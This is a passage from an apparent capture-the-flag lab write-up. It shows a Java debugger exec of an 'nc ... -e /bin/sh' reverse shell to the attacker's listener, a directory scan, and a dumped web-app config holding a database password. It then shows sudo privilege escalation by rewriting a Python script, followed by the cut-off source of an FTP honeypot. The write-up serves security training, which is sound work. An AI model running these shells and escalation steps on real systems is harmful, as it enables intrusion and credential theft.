+sun.util.ResourceBundleEnumeration
+sun.util.calendar.AbstractCalendar
+sun.util.calendar.BaseCalendar
+sun.util.calendar.BaseCalendar$Date
+sun.util.calendar.CalendarDate
+sun.util.calendar.CalendarSystem
+sun.util.calendar.CalendarUtils
+sun.util.calendar.Gregorian
+sun.util.calendar.Gregorian$Date
+sun.util.calendar.ZoneInfo
+sun.util.calendar.ZoneInfoFile
+sun.util.calendar.ZoneInfoFile$1
+sun.util.calendar.ZoneInfoFile$Checksum
+sun.util.calendar.ZoneInfoFile$ZoneOffsetTransitionRule
+sun.util.calendar.ZoneInfoFile$ZoneOffsetTransitionRule[]
+sun.util.cldr.CLDRBaseLocaleDataMetaInfo
+sun.util.cldr.CLDRBaseLocaleDataMetaInfo$TZCanonicalIDMapHolder
+sun.util.cldr.CLDRCalendarDataProviderImpl
+sun.util.cldr.CLDRCalendarNameProviderImpl
+sun.util.cldr.CLDRLocaleProviderAdapter
+sun.util.cldr.CLDRLocaleProviderAdapter$$Lambda$115.516684135
+sun.util.cldr.CLDRLocaleProviderAdapter$$Lambda$260.665318551
+sun.util.cldr.CLDRLocaleProviderAdapter$$Lambda$272.281124513
+sun.util.cldr.CLDRLocaleProviderAdapter$1
+sun.util.cldr.CLDRTimeZoneNameProviderImpl
+sun.util.locale.BaseLocale
+sun.util.locale.BaseLocale$Cache
+sun.util.locale.BaseLocale$Key
+sun.util.locale.Extension
+sun.util.locale.InternalLocaleBuilder
+sun.util.locale.InternalLocaleBuilder$CaseInsensitiveChar
+sun.util.locale.LanguageTag
+sun.util.locale.LocaleExtensions
+sun.util.locale.LocaleObjectCache
+sun.util.locale.LocaleObjectCache$CacheEntry
+sun.util.locale.LocaleUtils
+sun.util.locale.ParseStatus
+sun.util.locale.StringTokenIterator
+sun.util.locale.UnicodeLocaleExtension
+sun.util.locale.provider.AvailableLanguageTags
+sun.util.locale.provider.BaseLocaleDataMetaInfo
+sun.util.locale.provider.CalendarDataProviderImpl
+sun.util.locale.provider.CalendarDataUtility
+sun.util.locale.provider.CalendarDataUtility$CalendarFieldValueNamesMapGetter
+sun.util.locale.provider.CalendarDataUtility$CalendarWeekParameterGetter
+sun.util.locale.provider.CalendarNameProviderImpl
+sun.util.locale.provider.CalendarNameProviderImpl$LengthBasedComparator
+sun.util.locale.provider.CalendarProviderImpl
+sun.util.locale.provider.DateFormatSymbolsProviderImpl
+sun.util.locale.provider.DecimalFormatSymbolsProviderImpl
+sun.util.locale.provider.FallbackLocaleProviderAdapter
+sun.util.locale.provider.JRELocaleProviderAdapter
+sun.util.locale.provider.JRELocaleProviderAdapter$$Lambda$113.123295053
+sun.util.locale.provider.JRELocaleProviderAdapter$$Lambda$114.1102503153
+sun.util.locale.provider.JRELocaleProviderAdapter$$Lambda$126.556291227
+sun.util.locale.provider.JRELocaleProviderAdapter$$Lambda$129.32538530
+sun.util.locale.provider.JRELocaleProviderAdapter$$Lambda$261.1487492891
+sun.util.locale.provider.JRELocaleProviderAdapter$$Lambda$262.1168088211
+sun.util.locale.provider.JRELocaleProviderAdapter$$Lambda$273.1338634536
+sun.util.locale.provider.LocaleDataMetaInfo
+sun.util.locale.provider.LocaleProviderAdapter
+sun.util.locale.provider.LocaleProviderAdapter$1
+sun.util.locale.provider.LocaleProviderAdapter$NonExistentAdapter
+sun.util.locale.provider.LocaleProviderAdapter$Type
+sun.util.locale.provider.LocaleProviderAdapter$Type[]
+sun.util.locale.provider.LocaleResources
+sun.util.locale.provider.LocaleResources$ResourceReference
+sun.util.locale.provider.LocaleServiceProviderPool
+sun.util.locale.provider.LocaleServiceProviderPool$LocalizedObjectGetter
+sun.util.locale.provider.NumberFormatProviderImpl
+sun.util.locale.provider.ResourceBundleBasedAdapter
+sun.util.locale.provider.TimeZoneNameProviderImpl
+sun.util.locale.provider.TimeZoneNameUtility
+sun.util.locale.provider.TimeZoneNameUtility$TimeZoneNameGetter
+sun.util.logging.PlatformLogger
+sun.util.logging.PlatformLogger$Bridge
+sun.util.logging.PlatformLogger$ConfigurableBridge
+sun.util.logging.PlatformLogger$ConfigurableBridge$LoggerConfiguration
+sun.util.logging.PlatformLogger$Level
+sun.util.logging.PlatformLogger$Level[]
+sun.util.logging.internal.LoggingProviderImpl
+sun.util.logging.internal.LoggingProviderImpl$JULWrapper
+sun.util.logging.internal.LoggingProviderImpl$LogManagerAccess
+sun.util.logging.resources.logging
+sun.util.resources.Bundles
+sun.util.resources.Bundles$1
+sun.util.resources.Bundles$BundleReference
+sun.util.resources.Bundles$CacheKey
+sun.util.resources.Bundles$CacheKeyReference
+sun.util.resources.Bundles$Strategy
+sun.util.resources.LocaleData
+sun.util.resources.LocaleData$1
+sun.util.resources.LocaleData$LocaleDataStrategy
+sun.util.resources.OpenListResourceBundle
+sun.util.resources.TimeZoneNamesBundle
+sun.util.resources.cldr.CalendarData
+sun.util.resources.cldr.TimeZoneNames
+sun.util.resources.cldr.TimeZoneNames_en
+sun.util.resources.cldr.provider.CLDRLocaleDataMetaInfo
+sun.util.resources.provider.NonBaseLocaleDataMetaInfo
+sun.util.spi.CalendarProvider
+util.CollectionUtils
+util.HistoryList
+util.demangler.GenericDemangledDataType
+util.demangler.GenericDemangledType
+utilities.util.FileUtilities
+utilities.util.FileUtilities$$Lambda$88.1642030774
+utilities.util.FileUtilities$$Lambda$89.411506101
+utilities.util.reflection.ReflectionUtilities
+utilities.util.reflection.ReflectionUtilities$$Lambda$259.337615155
+utility.applicaiton.ApplicationLayout
+utility.applicaiton.ApplicationSettings
+utility.applicaiton.ApplicationUtilities
+utility.module.ModuleManifestFile
+utility.module.ModuleUtilities
+utility.module.ModuleUtilities$$Lambda$87.2128029086
+
+then 
+stop in org.apache.logging.log4j.core.util.WatchManager$WatchRunnable.run()
+
+and revshell
+
+print new java.lang.Runtime().exec("nc 10.8.19.103 4444 -e /bin/sh")
+
+> stop in org.apache.logging.log4j.core.util.WatchManager$WatchRunnable.run()
+stop in org.apache.logging.log4j.core.util.WatchManager$WatchRunnable.run()
+Set breakpoint org.apache.logging.log4j.core.util.WatchManager$WatchRunnable.run()
+> 
+Breakpoint hit: "thread=Log4j2-TF-4-Scheduled-1", org.apache.logging.log4j.core.util.WatchManager$WatchRunnable.run(), line=96 bci=0
+
+Log4j2-TF-4-Scheduled-1[1] print new java.lang.Runtime().exec("nc 10.8.19.103 4444 -e /bin/sh")
+print new java.lang.Runtime().exec("nc 10.8.19.103 4444 -e /bin/sh")
+ new java.lang.Runtime().exec("nc 10.8.19.103 4444 -e /bin/sh") = "Process[pid=20449, exitValue="not exited"]"
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ rlwrap nc -lvnp 4444                                     
+listening on [any] 4444 ...
+connect to [10.8.19.103] from (UNKNOWN) [10.10.236.29] 35426
+python3 -c "import pty; pty.spawn('/bin/bash')" || python -c "import pty; pty.spawn('/bin/bash')" || /usr/bin/script -qc /bin/bash /dev/null
+veronica@ubuntu:~$ ls
+ls
+base.py  Documents  examples.desktop  Music     Public       Templates  Videos
+Desktop  Downloads  ghidra_9.0        Pictures  __pycache__  user.txt
+veronica@ubuntu:~$ cat user.txt
+cat user.txt
+THM{EB0C770CCEE1FD73204F954493B1B6C5E7155B177812AAB47EFB67D34B37EBD3}
+
+┌──(root㉿kali)-[/home/witty/.ssh]
+└─# dirsearch -u http://10.10.236.29/ -i200,301,302,401
+
+  _|. _ _  _  _  _ _|_    v0.4.2
+ (_||| _) (/_(_|| (_| )
+
+Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927
+
+Output File: /root/.dirsearch/reports/10.10.236.29/-_23-07-25_15-52-39.txt
+
+Error Log: /root/.dirsearch/logs/errors-23-07-25_15-52-39.log
+
+Target: http://10.10.236.29/
+
+[15:52:40] Starting: 
+[15:52:44] 200 -   35B  - /.bowerrc
+[15:52:46] 200 -  497B  - /.editorconfig
+[15:52:48] 200 -  429B  - /.gitattributes
+[15:52:48] 200 -    3KB - /.gitignore
+[15:52:52] 200 -    2KB - /.scrutinizer.yml
+[15:52:53] 200 -    4KB - /.travis.yml
+[15:52:58] 200 -    3KB - /CONTRIBUTING.md
+[15:53:01] 200 -    2KB - /README.md
+[15:53:08] 301 -  312B  - /admin  ->  http://10.10.236.29/admin/
+[15:53:09] 302 -    0B  - /admin/  ->  ../index.php/admin
+[15:53:09] 302 -    0B  - /admin/?/login  ->  ../index.php/admin
+[15:53:09] 302 -    0B  - /admin/admin.php  ->  ../index.php/admin
+[15:53:10] 302 -    0B  - /admin/index.php  ->  ../index.php/admin
+[15:53:23] 301 -  318B  - /application  ->  http://10.10.236.29/application/
+[15:53:23] 200 -  114B  - /application/logs/
+[15:53:23] 200 -  114B  - /application/
+[15:53:24] 301 -  313B  - /assets  ->  http://10.10.236.29/assets/
+[15:53:24] 200 -    2KB - /assets/
+[15:53:31] 200 -    1KB - /composer.json
+[15:53:38] 301 -  311B  - /docs  ->  http://10.10.236.29/docs/
+[15:53:38] 200 -    2KB - /docs/
+[15:53:47] 200 -   40KB - /index.php
+[15:53:48] 301 -  316B  - /installer  ->  http://10.10.236.29/installer/
+[15:53:55] 200 -   80B  - /manifest.yml
+[15:54:07] 200 -  638B  - /phpunit.xml
+[15:54:08] 200 -  114B  - /plugins/
+[15:54:08] 301 -  314B  - /plugins  ->  http://10.10.236.29/plugins/
+[15:54:15] 200 -    0B  - /shell.php
+[15:54:22] 200 -    4KB - /tests/
+[15:54:22] 301 -  312B  - /tests  ->  http://10.10.236.29/tests/
+[15:54:22] 200 -    1KB - /themes/
+[15:54:22] 301 -  313B  - /themes  ->  http://10.10.236.29/themes/
+[15:54:23] 301 -  310B  - /tmp  ->  http://10.10.236.29/tmp/
+[15:54:23] 200 -  255B  - /tmp/
+[15:54:24] 301 -  313B  - /upload  ->  http://10.10.236.29/upload/
+[15:54:24] 200 -    2KB - /upload/
+
+Task Completed
+
+veronica@ubuntu:/var/www/html/limesurvey/application/config$ cat config.php
+cat config.php
+<?php if (!defined('BASEPATH')) exit('No direct script access allowed');
+/*
+| -------------------------------------------------------------------
+| DATABASE CONNECTIVITY SETTINGS
+| -------------------------------------------------------------------
+| This file will contain the settings needed to access your database.
+|
+| For complete instructions please consult the 'Database Connection'
+| page of the User Guide.
+|
+| -------------------------------------------------------------------
+| EXPLANATION OF VARIABLES
+| -------------------------------------------------------------------
+|
+|    'connectionString' Hostname, database, port and database type for 
+|     the connection. Driver example: mysql. Currently supported:
+|                 mysql, pgsql, mssql, sqlite, oci
+|    'username' The username used to connect to the database
+|    'password' The password used to connect to the database
+|    'tablePrefix' You can add an optional prefix, which will be added
+|                 to the table name when using the Active Record class
+|
+*/
+return array(
+	'components' => array(
+		'db' => array(
+			'connectionString' => 'mysql:host=localhost;port=3306;dbname=limedb;',
+			'emulatePrepare' => true,
+			'username' => 'Anny',
+			'password' => 'P4$W0RD!!#S3CUr3!',
+			'charset' => 'utf8mb4',
+			'tablePrefix' => 'lime_',
+		),
+		
+		// Uncomment the following lines if you need table-based sessions.
+		// Note: Table-based sessions are currently not supported on MSSQL server.
+		// 'session' => array (
+			// 'class' => 'application.core.web.DbHttpSession',
+			// 'connectionID' => 'db',
+			// 'sessionTableName' => '{{sessions}}',
+		// ),
+		
+		'urlManager' => array(
+			'urlFormat' => 'path',
+			'rules' => array(
+				// You can add your own rules here
+			),
+			'showScriptName' => true,
+		),
+	
+	),
+	// For security issue : it's better to set runtimePath out of web access
+	// Directory must be readable and writable by the webuser
+	// 'runtimePath'=>'/var/limesurvey/runtime/'
+	// Use the following config variable to set modified optional settings copied from config-defaults.php
+	'config'=>array(
+	// debug: Set this to 1 if you are looking for errors. If you still get no errors after enabling this
+	// then please check your error-logs - either in your hosting provider admin panel or in some /logs directory
+	// on your webspace.
+	// LimeSurvey developers: Set this to 2 to additionally display STRICT PHP error messages and get full access to standard templates
+		'debug'=>0,
+		'debugsql'=>0, // Set this to 1 to enanble sql logging, only active when debug = 2
+		// Update default LimeSurvey config here
+	)
+);
+/* End of file config.php */
+/* Location: ./application/config/config.php */
+
+veronica@ubuntu:~$ cat base.py
+cat base.py
+import base64
+
+hijackme = base64.b64encode(b'tryhackme is the best')
+print(hijackme)
+
+veronica@ubuntu:~$ cat /etc/crontab
+cat /etc/crontab
+```
+```text
+# /etc/crontab: system-wide crontab
+```
+```text
+# Unlike any other crontab you don't have to run the `crontab'
+```
+```text
+# command to install the new version when you edit this file
+```
+```text
+# and files in /etc/cron.d. These files also have username fields,
+```
+```text
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+```
+
+## Privilege Escalation
+```text
+# m h dom mon dow user	command
+17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
+25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+*  *	* * *	root	cd /root/Lucrecia && bash lucre.sh
+
+veronica@ubuntu:~$ sudo -l
+sudo -l
+Matching Defaults entries for veronica on ubuntu:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User veronica may run the following commands on ubuntu:
+    (ALL : ALL) ALL
+    (root : root) NOPASSWD: /usr/bin/python3.5 /home/veronica/base.py
+
+veronica@ubuntu:~$ lsattr base.py
+lsattr base.py
+-------------e-- base.py
+
+veronica@ubuntu:~$ chattr -e base.py
+chattr -e base.py
+chattr: Permission denied while setting flags on base.py
+
+veronica@ubuntu:~$ rm base.py
+
+rm: remove write-protected regular file 'base.py'? yes
+
+veronica@ubuntu:~$ ls
+
+Desktop    Downloads         ghidra_9.0  Pictures  __pycache__  user.txt
+Documents  examples.desktop  Music       Public    Templates    Videos
+veronica@ubuntu:~$ echo 'import pty;pty.spawn("/bin/bash")' > base.py
+
+veronica@ubuntu:~$ cat base.py
+
+import pty;pty.spawn("/bin/bash")
+
+veronica@ubuntu:~$ sudo /usr/bin/python3.5 /home/veronica/base.py
+
+root@ubuntu:~# cd /root
+
+root@ubuntu:/root# ls
+
+Lucrecia  root.txt
+root@ubuntu:/root# cat root.txt
+
+THM{02EAD328400C51E9AEA6A5DB8DE8DD499E10E975741B959F09BFCF077E11A1D9}
+
+root@ubuntu:/root# cd Lucrecia
+
+root@ubuntu:/root/Lucrecia# ls
+
+Activity.log  LICENSE      lucre.sh   requirements.txt
+img           lucrecia.py  README.md  server.conf
+root@ubuntu:/root/Lucrecia# cat lucrecia.py
+                            cat lucrecia.py
+cat lucrecia.py
+```
+```text
+# HONEYPOT MEDIUM-INTERACTION
+```
+```text
+# Creator: Kirari
+
+import os
+import sys
+import time
+import socket
+import logging
+import argparse
+import configparser
+
+from os import system
+from random import choice as rand
+from os.path import isfile
+from threading import Thread
+from datetime import datetime as dt
+from argparse import RawTextHelpFormatter
+
+threads = []
+```
+```text
+# Clase servidor
+
+class Server(object):
+
+	def __init__(self,host,port):
+
+		self.host = host
+		self.port = port
+
+	def create_socket(self):
+
+		try:
+			self.server = socket.socket()
+			self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+		except socket.error as s:
+			print("Error: ",s)
+			sys.exit(0)
+
+		return
+
+	def start(self):
+
+		self.create_socket()
+		
+		try:
+		
+			self.server.bind((self.host,self.port))
+		
+		except OSError:
+
+			print(" \033[1;39m[\033[1;31mx\033[1;39m] Another process is already using port {}\n".format(self.port))
+
+			sys.exit(0)
+
+		self.server.listen(10)
+
+		return 
+
+	def stop(self):
+
+		self.server.close()
+
+		return
+```
+```text
+# Clase manipuladora FTP 
+
+class HandlingFTP(object):
+
+	def __init__(self,conn):
+
+		self.conn = conn
+		self.passive_mode = False
+
+		self.list_directory = ""
+
+	def start_new_connection(self):
+	
+		if self.passive_mode:
+
+			self.socket_, cData = self.dataServer.accept()
+
+		else:
+
+			self.socket_ = socket.socket(socket.AF_INET,socket.SOCK_STREAM) 
+			self.socket_.connect((self.dataIP,self.dataPort))
+
+		return
+
+	def stop_new_connection(self):
+
+		self.socket_.close()
+
+		if self.passive_mode:
+
+			self.dataServer.close()	
+
+		return
+
+	''' Modo activo por defecto '''
+
+	''' Este modo funciona cuando el cliente solicita el servidor, enviando un comando PORT, a través de un puerto aleatorio, 
+	    con un paquete dirigido al puerto 21 (puede ser otro), a fin de transferir un archivo. Una vez establecida la conexión, 
+	    el servidor inicia otra.
+
+		El servidor, a través del puerto 20, se pone en contacto inmediatamente con el puerto siguiente del cliente, es decir, 
+		imaginemos que el puerto utilizado en la primera conexión, por este, fue el 1500, la utilizada a efectos de la segunda 
+		conexión será la 1501 (por ejemplo), canal de datos. ''' 
+
+	def PORT(self,data):
+
+		self.passive_mode = False
+
+		data_client = data.split(',')
+
+		self.dataIP = '.'.join(data_client[:4])
+		self.dataPort = (int(data_client[4])*256)+int(data_client[5])
+
+		self.conn.sendall(b"200 PORT command successful. Consider using PASV.\n")
+
+		return
+
+	''' Modo pasivo '''
+
+	''' El cliente abre el canal de coandos a través de un puerto (ej:1500). 
+		Envía el comando PASV al servidor dirigido al puerto 21.
+		El comando cambia la transmisión al modo pasivo.
+		A través del canal de comandos, el servidor envía al cliente el puerto que escuchará el canal de datos, por ejemplo 2345.
+		El cliente abre el canal de datos en el puerto 1501 para el puerto 2345 del servidor.
+		El servidor confirma la conexión del canal de datos.
+		Los canales de comandos y datos están abiertos y listos para su actividad. ''' 
+
+	def PASV(self,host,port):
+
+		self.passive_mode = True
+
+		self.dataServer = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+		self.dataServer.bind((host,port))
+		self.dataServer.listen(1)
+
+		(ip,port) = self.dataServer.getsockname()
+
+		ip = ','.join(ip.split('.'))
+
+		port = ','.join([str((port // 256)),str(port-((port // 256) * 256))])
+
+		msg = bytes("227 Entering Passive Mode ({},{}).\n".format(ip,port),encoding="utf-8")
+
+		self.conn.sendall(msg)
+
+		return
+
+	def LIST(self,directory):
+
+		data_files = [
+		
+		["r-x------","rwx------","rw-------"],
+		["5513 ","45550","1351 ","4096 ","1024 ","54324"],
+		["Feb 7 ", "Dec 12", "Nov 28", "Jan 4 "],
+
+		]
+
+		if (self.list_directory==""):
+
+			msg = "\r"
+
+			for file in directory:
+
+				msg += "-{}    1 0        0            {} {}  2019 {}\r\n".format(rand(data_files[0]),rand(data_files[1]),rand(data_files[2]),file)
+
+			msg += "\r"
+
+			self.list_directory = msg
+
+		self.start_new_connection()
+		self.socket_.sendall(bytes(self.list_directory,encoding="utf-8"))
+		self.stop_new_connection()
+		self.conn.sendall(b'150 Here comes the directory listing.\n226 Directory send OK.\n')
+
+		return
+
+	def NLST(self,directory):
+
+		msg = "\r"
+
+		for file in directory:
+			msg += "{}\r\n".format(file)
+
+		msg += "\r"
+
+		self.start_new_connection()
+		self.socket_.sendall(bytes(msg,encoding="utf-8"))
+		self.stop_new_connection()
+		self.conn.sendall(b'150 Here comes the directory listing.\n226 Directory send OK.\n')
+
+		return
+
+	def TYPE(self,data):
+
+		data = data.split()[1]
+
+		if (data=="A"):
+
+			self.conn.sendall(b'200 Switching to ASCII mode.\n')
+
+		elif (data=="I"):
+
+			self.LIMIT_HP()
+
+		#	self.start_new_connection()
+		#	self.socket_.sendall(bytes(msg,encoding="utf-8"))
+		#	self.stop_new_connection()
+		#	self.conn.sendall(b'150 Opening BINARY mode data connection for net.txt (- bytes).\n226 Transfer complete.\n')
+
+		return
+
+	def QUIT(self):
+
+		self.conn.sendall(b'221 Goodbye.\n')
+		self.conn.close()
+
+		return 
+
+	def SYST(self):
+
+		self.conn.sendall(b'215 UNIX Type: L8\n')
+
+		return
+
+	def CDUP(self):
+
+		self.conn.sendall(b'250 Directory successfully changed.\n')
+
+		return
+
+	def USER(self):
+
+		self.conn.sendall(b'530 Can\'t change to another user.\n')
+
+		return
+
+	def PWD(self,directory):
+		
+		pwd = bytes(directory,"utf-8")
+
+		self.conn.sendall(b'257 "'+pwd+b'" is the current directory\n')
+
+		return
+
+	def MKD(self):
+
+		self.conn.sendall(b'257 Directory created.\n')
+
+		return
+
+	
+	def FTPerror(self):
+
+		self.conn.sendall(b'530 Please login with USER and PASS.\n')
+
+		return
+
+	def LIMIT_HP(self):
+
+		self.conn.sendall(b'550 Permission denied.\n')
+
+		return
+
+	def DISCONNECT(self):
+
+		self.conn.sendall(b"421 Service not available, remote server has closed connection\n")
+
+		return
+```
+```text
+# Clase Honeypot
+
+class Honeypot(Server):
+
+	def __init__(self,conf):
+
+		Server.__init__(self,conf[0],conf[1])
+
+		self.user = conf[2]
+		self.password = conf[3]
+		self.currentDirectory = conf[4]
+		self.message = conf[5]
+
+		self.directory = conf[6].split(',')
+
+		#print(self.directory)
+
+		FORMAT = " [%(levelname)s] (%(asctime)-15s) <%(clientip)s::%(port)s> %(message)s"
+
+		logging.basicConfig(format=FORMAT,filename="Activity.log",level=logging.DEBUG)
+
+		print (" \033[0;39m[\033[1;34m+\033[0;39m] Honeypot ready!")
+
+	def run(self):
+
+		time.sleep(1.3)
+
+		print (" \033[0;39m[\033[1;32m+\033[0;39m] Honeypot Activaded...\n")
+
+		cont = 1
+
+		while (True):
+
+			try:
+
+				(conn,intruder) = self.server.accept()
+```
+```text
+# Enviar primer trama
+
+				welcome_msg = '220 {}\n'.format(self.message)
+
+				conn.sendall(bytes(welcome_msg,encoding="utf-8"))
+				
+				thread = Thread(name="Intruder "+str(cont),target=self.FTP,args=(conn,intruder,))
+				threads.append(thread)
+				thread.setDaemon(True)
+				thread.start()
+
+			except ConnectionResetError:
+
+				print(" \033[1;39m[\033[1;31mx\033[1;39m] Connection to a possible intruder has been lost.\n")
+				conn.close()
+
+			cont += 1
+
+		return
+
+	@staticmethod
+	def CalcTime():
+
+		datetime = dt.now()
+
+		time_ = "{}:{}:{}".format(datetime.hour,datetime.minute,datetime.second)
+
+		date_ = "{}/{}/{}".format(datetime.day,datetime.month,datetime.year)
+
+		return (time_,date_)
+
+	@staticmethod
+	def msg_request(client,request,logging,data_info):	
+
+		logging.info("The intruder has sent a {} request.".format(request),extra=data_info)
+		print(" [\033[1;31m{}\033[0;39m] The intruder has sent a {} request.".format(client,request))
+
+		return
+
+	def FTP(self,connection,client):
+
+		try:
+```
+```text
+# Vericar si el atacante se logueo
+			self.isLoggedIn = False
+
+			data_info = {"clientip":client[0],'port':client[1]}
+
+			logging.warning("An intruder has accessed the FTP service", extra=data_info)
+
+			print(" [\033[1;33mWARNING\033[0;39m] Someone has accessed the FTP service from {} through port {}.".format(client[0],client[1]))
+```
+```text
+# Datos enviados por atacante
+			activity = (connection.recv(2048)).decode(encoding="utf-8")
+```
+```text
+# Manipulador de comandos FTP
+			handler = HandlingFTP(connection)
+
+			while (activity!="QUIT"):
+
+				if (self.isLoggedIn==False):
+
+					if (activity.startswith("USER")):
+
+						user = (activity.strip()).split()[1]
+
+						#print(user)
+
+						connection.sendall(b"331 Please specify the password.\n")
+
+					elif (activity.startswith("PASS")):
+						
+						try:					
+							
+							password = (activity.strip()).split()[1]
+
+						except IndexError:
+
+							password = ""
+
+						#print(self.password)
+
+						if (user==self.user) and (password==self.password):
+
+							dt_now = self.CalcTime()
+
+							logging.info("The intruder is logged in with credentials: {} -> {}.".format(user,password), extra=data_info)
+
+							print(" [\033[1;34m{}\033[0;39m] The intruder is logged in with credentials: {} -> {} at {} on {}.".format(client[0],user,password,dt_now[0],dt_now[1]))
+							#print(" [\033[1;32mDATETIME\033[1;39m] {}".format(dt.now()))
+
+							connection.sendall('230 Login successful.\n'.encode())
+
+							self.isLoggedIn = True
+
+							""" 00000000000000000000000000.\n"""
+							""" Remote system type is UNIX.\n"""
+							""" Using binary mode to transfer files.\n"""
+
+						elif ((user!=self.user) and (password!=self.password)) or \
+							 ((user==self.user) and (password!=self.password)) or \
+							 ((user!=self.user) and (password==self.password)):
+
+							dt_now = self.CalcTime()
+
+							logging.info("Intruder is trying to log in with credentials: {} -> {}".format(user,password), extra=data_info)
+
+							print(" [\033[1;32mINFO\033[0;39m] Intruder {} is trying to log in with credentials: {} -> {} at {} on {}".format(client[0],user,password,dt_now[0],dt_now[1]))
+							#print(" [\033[1;32mDatetime\033[1;39m] {}".format(dt.now()))
+
+							connection.sendall(b'530 Login incorrect.\n')
+
+					else:
+						logging.info("The intruder is trying to execute commands.", extra=data_info)
+
+						print(" [\033[1;31m{}\033[0;39m] The intruder is trying to execute commands".format(client[0]))
+
+						handler.FTPerror()	
+
+				else:
+
+					if (activity=="SYST") and (self.isLoggedIn==True):
+						logging.info("The intruder is trying to execute commands.", extra=data_info)
+						print(" [\033[1;31m{}\033[0;39m] The intruder is executing commands.".format(client[0]))
+						handler.SYST()
+
+					elif (activity=="PWD"):
+						self.msg_request(client[0],activity,logging,data_info)
+						handler.PWD(self.currentDirectory)
+
+					elif (activity=="CDUP"):
+						self.msg_request(client[0],activity,logging,data_info)
+						handler.CDUP()
+
+					elif (activity.startswith("USER")):
+						self.msg_request(client[0],activity,logging,data_info)
+						handler.USER()
+
+					elif (activity.startswith("PORT")):
+						logging.info("The intruder is using the Active mode to operate.", extra=data_info)
+						print(" [\033[1;31m{}\033[0;39m] The intruder is using the Active mode to operate.".format(client[0],activity))
+						activity = activity.replace("PORT ","")
+						handler.PORT(activity)
+
+					elif (activity.startswith("PASV")):
+						logging.info("The intruder is using the						logging.info("The intruder is using the						logging.info("The intruder is using the Passive mode to operate.", extra=data_info)
+						print(" [\033[1;31m{}\033[0;39m] The intruder is using the Passive mode to operate.".format(client[0],activity))
+						handler.PASV(client[0],0) # 0 -> indica un puerto aleatorio
+
+					elif (activity=="LIST"):
+						self.msg_request(client[0],activity,logging,data_info)
+						handler.LIST(self.directory)
+
+					elif (activity.startswith("TYPE")):
+						self.msg_request(client[0],activity,logging,data_info)
+						handler.TYPE(activity)
+
+					elif (activity=="NLST"):
+						self.msg_request(client[0],activity,logging,data_info)
+						handler.NLST(self.directory)
+
+					elif (activity.startswith("MKD")):
+						self.msg_request(client[0],activity,logging,data_info)
+						handler.MKD()
+
+					else:
+						logging.info("Intruder has been denied access to run some commands.", extra=data_info)
+						print(" [\033[1;32mINFO\033[0;39m] Access to {} has been denied to run some commands".format(client[0],client[0]))
+						handler.LIMIT_HP()
+
+				activity = (connection.recv(2048)).decode(encoding="utf-8")
+				activity = activity.strip()
+
+				#print("Petición: ",activity)
+
+			handler.QUIT()
+			logging.info("Intruder has disconnected.", extra=data_info)
+			print(" [\033[1;34m{}\033[0;39m] Intruder has disconnected.".format(client[0]))
+
+		except BrokenPipeError:
+
+			logging.info("Intruder has fallen", extra=data_info)
+			print(" [\033[1;34m{}\033[0;39m] Intruder has fallen.".format(client[0]))
+
+		except KeyboardInterrupt:
+
+			handler.DISCONNECT()
+
+		return
+
+def banner():
+
+	msg = "\n\n\033[0;31m"
+	msg += " ██▓     █    ██  ▄████▄   ██▀███  ▓█████  ▄████▄   ██▓ ▄▄▄  \n"
+	msg += "▓██▒     ██  ▓██▒▒██▀ ▀█  ▓██ ▒ ██▒▓█   ▀ ▒██▀ ▀█  ▓██▒▒████▄    \n"
+	msg += "▒██░    ▓██  ▒██░▒▓█    ▄ ▓██ ░▄█ ▒▒███   ▒▓█    ▄ ▒██▒▒██  ▀█▄  \n"
+	msg += "▒██░    ▓▓█  ░██░▒▓▓▄ ▄██▒▒██▀▀█▄  ▒▓█  ▄ ▒▓▓▄ ▄██▒░██░░██▄▄▄▄██ \n"
+	msg += "░██████▒▒▒█████▓ ▒ ▓███▀ ░░██▓ ▒██▒░▒████▒▒ ▓███▀ ░░██░ ▓█   ▓██▒\n"
+	msg += "░ ▒░▓  ░░▒▓▒ ▒ ▒ ░ ░▒ ▒  ░░ ▒▓ ░▒▓░░░ ▒░ ░░ ░▒ ▒  ░░▓   ▒▒   ▓▒█░\n"
+	msg += "░ ░ ▒  ░░░▒░ ░ ░   ░  ▒     ░▒ ░ ▒░ ░ ░  ░  ░  ▒    ▒ ░  ▒   ▒▒ ░\n"
+	msg += "  ░ ░    ░░░ ░ ░ ░          ░░   ░    ░   ░         ▒ ░  ░   ▒   \n"
+	msg += "    ░  ░   ░     ░ ░         ░        ░  ░░ ░       ░        ░  ░\n"
+	msg += "                 ░                        ░  \n"
+	msg += "                        \033[1;39mHONEYPOT\n\n"
+	msg += "                   Created by Kirari\n\033[0;39m"
+
+	return msg
+
+def preparate(conf):
+
+	if os.getuid()==0:
+
+		try:
+
+			print (" \033[0;39m[\033[1;34m*\033[0;39m] Lucrecia is preparing the Honeypot...")
+
+			time.sleep(2)
+
+			honeypot = Honeypot(conf)
+			honeypot.start()
+			honeypot.run()
+			#honeypot.stop()
+
+		except KeyboardInterrupt:
+
+			print("\n")
+
+			for _ in threads:
+
+				if (_.isAlive()):
+
+					print (" [*] "+_.name+" disconnected.")
+					time.sleep(1)
+
+			honeypot.stop() 
+
+			print ("\n\n \033[1;39m[\033[1;32m+\033[1;39m] Thank you so much for use Lucrecia Honeypot! Bye bye...\n")
+
+	else:
+
+		print ("\033[1;39m [\033[1;31mx\033[1;39m] You need to run the script as root.\n")
+
+	return
+
+def FileConfiguration(file):
+
+	config = configparser.ConfigParser()
+
+	config.read(file)
+
+	sectionDefault = config["DEFAULT"] 
+
+	host = sectionDefault["HOST"]
+	port = int(sectionDefault["PORT"])
+
+	sectionFTP = config["FTP"]
+
+	user = sectionFTP["USER"]
+	password = sectionFTP["PASSWORD"]
